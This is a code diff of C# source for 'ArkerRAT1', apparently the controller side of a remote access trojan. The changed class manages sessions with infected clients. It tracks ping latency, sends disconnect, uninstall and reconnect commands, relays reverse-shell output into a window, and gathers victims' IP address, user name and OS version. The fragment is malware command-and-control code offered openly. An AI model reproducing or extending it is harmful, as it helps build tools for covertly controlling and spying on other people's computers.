@@ -26,18 +26,19 @@ namespace ArkerRAT1
         //This button is too know which client button belongs to which client.
         public Button clientButton = new Button();
 
+        public int port = 0;
+
         public string tags { get; set; }
 
-        public string iPadress = "Unknown";
         public double ms = 0;
-        public string userName = "Unknown";
-        public string OSVersion = "Unknown";
+
+        public string clientInfo = "Unknown                      Unknown                      Unknown";
 
         public TcpClient client { get; set; }
         public NetworkStream clientStream { get; set; }
-        public RATHostSession(TcpClient tcpClient, string tag)
+        public RATHostSession(TcpClient tcpClient, string tag, int porte)
         {
-            
+            port = porte;
             client = tcpClient;
             clientStream = tcpClient.GetStream();
             token = source.Token;
@@ -78,52 +79,35 @@ namespace ArkerRAT1
         }
 
         string whenToStartPinging = "";
-        string[] firstTimeStamp = DateTime.Now.ToLongTimeString().Split(':', ' ');
-        string[] secondTimeStamp = DateTime.Now.ToLongTimeString().Split(':', ' ');
+        Stopwatch stopwatch;
         private async void Ping()
         {
-            await Task.Run(async () =>
+            await Task.Run(async() =>
             {
-                try
+                while (!token.IsCancellationRequested)
                 {
-                    int timedOut = 0;
-                    while (!token.IsCancellationRequested)
+                    if (whenToStartPinging == "")
                     {
-                        if (whenToStartPinging == "")
-                        {
-                            firstTimeStamp = DateTime.Now.ToLongTimeString().Split(':', ' ');
-                            await SendData("§Ping§");
+                        stopwatch = Stopwatch.StartNew();
+                        whenToStartPinging = "Wait fir callback";
+                        await SendData("§Ping§");
+                    }
 
-                            whenToStartPinging = "waitForCallBack";
-                        }
-
-                        if (whenToStartPinging == "§Ping§")
-                        {
-                            secondTimeStamp = DateTime.Now.ToLongTimeString().Split(':', ' ');
-
-                            double msSec = Convert.ToDouble(firstTimeStamp[2]);
-                            double msMin = Convert.ToDouble(firstTimeStamp[1]) * 60;
-                            double msH = Convert.ToDouble(firstTimeStamp[0]) * 60 * 60;
-
-                            double msSec2 = Convert.ToDouble(firstTimeStamp[2]);
-                            double msMin2 = Convert.ToDouble(firstTimeStamp[1]) * 60;
-                            double msH2 = Convert.ToDouble(firstTimeStamp[0]) * 60 * 60;
-
-                            ms = (((msSec2 + msMin2 + msH2) - (msSec + msMin + msH))) * 1000;
-                            whenToStartPinging = "";
-                            timedOut = 0;
-                        }
-                        Thread.Sleep(5000);
-                        timedOut++;
-                        if(timedOut == 5)
-                        {
-                            Disconnect(this, new EventArgs());
-                        }
+                    if (whenToStartPinging == "§Ping§")
+                    {
+                        ms = stopwatch.ElapsedMilliseconds;
+                        whenToStartPinging = "";
+                        stopwatch.Stop();
+                    }
+                    
+                    if (stopwatch.ElapsedMilliseconds == 25000)
+                    {
+                        stopwatch.Stop();
+                        RemoveThisClientUI();
+                        await SendData("§Reconnect§");
                     }
                 }
-                catch (Exception ex) { }
-
-
+                
             });
         }
 
@@ -131,31 +115,28 @@ namespace ArkerRAT1
         {
             Task.Run(() =>
             {
+                ArkerRATServerMechanics.rATClients.Remove(this);
+                source.Cancel();
+                clientStream.Close();
+                client.Close();
                 if (reverseShellWindow != null)
                 {
                     reverseShellWindow.Close();
                 }
-                source.Cancel();
-                clientStream.Close();
-                client.Close();
-                ArkerRATServerMechanics.RATClients.Remove(this);
             }); 
         }
 
         public async void Disconnect(object sender, EventArgs e)
         {
+            RemoveThisClientUI();
             await SendData("§Disconnect§");
-            RemoveThisClientUI();
-            RemoveThisClientUI();
-            RemoveThisClientUI();
-
         }
 
 
         public async void Uninstall(object sender, EventArgs e)
         {
-            await SendData("§Uninstall§");
             RemoveThisClientUI();
+            await SendData("§Uninstall§");
 
         }
 
@@ -173,7 +154,8 @@ namespace ArkerRAT1
         {
             if (data.Contains("§ReverseShell§"))
             {
-                reverseShellWindow.data = data.Replace("§ReverseShell§", "").Replace("§Ping§", "");
+                string tempString = data;
+                reverseShellWindow.data = tempString.Replace("§ReverseShell§", "").Replace("§Ping§", "");
                 await reverseShellWindow.ReversShellFunction();
             }
 
@@ -182,27 +164,12 @@ namespace ArkerRAT1
                 whenToStartPinging = "§Ping§";
             }
 
-            if (data.Contains("§IP§"))
+            if (data.Contains("§ClientInfo§"))
             {
-                data.Replace("§IP§", "");
-                string bugfix = data.Replace("§IP§", "");
+                string tempString = data;
 
-                iPadress = bugfix.Replace("§Ping§", "");
-            }
+                clientInfo = tempString.Replace("§ClientInfo§", "");
 
-            if (data.Contains("§UserName§"))
-            {
-                data.Replace("§UserName§", "");
-                string bugfix = data.Replace("§UserName§", "");
-                userName = bugfix.Replace("§Ping§", "").Replace("§OSVersion§", "");
-            }
-
-            if (data.Contains("§OSVersion§"))
-            {
-                data.Replace("§OSVersion§", "");
-                string bugfix = data.Replace("§OSVersion§", "");
-
-                OSVersion = bugfix.Replace("§Ping§","").Replace("§OSVersion§", "").Replace("§UserName§", "");
             }
         }
     }
